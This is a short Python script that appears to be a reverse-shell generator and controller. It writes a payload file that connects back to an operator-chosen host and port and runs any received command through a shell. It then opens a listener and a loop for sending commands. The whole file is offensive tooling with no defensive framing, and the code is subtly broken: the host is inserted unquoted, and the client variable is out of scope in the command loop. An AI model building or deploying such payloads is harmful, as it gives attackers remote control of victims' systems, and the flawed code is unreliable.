import socket

def init():

  HOST = input("Input Host: ")
  PORT = input("Input Port: ")

  PORT = int(PORT)

  payloadCode = f"""
import socket
import subprocess

client = socket.socket()
client.connect(({HOST}, {PORT}))

while True:
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    client.send(output + output_error)
  """

  payloadName = input("Input Payload Name: ")
  f = open(f"{payloadName}.py","w+" )
  f.write(payloadCode)
  f.close()

  server = socket.socket()
  server.bind((HOST, PORT))
  print('[+] Server Started')
  print('[+] Listening For Client Connection ...')
  server.listen(1)
  client, client_addr = server.accept()
  print(f'[+] {client_addr} Client connected to the server')

def reverse_shell():
  while True:
      command = input('Exploitable: ~ exploit$ ')
      command = command.encode()
      client.send(command)
      output = client.recv(1024)
      output = output.decode()
      print(f"Output: {output}")

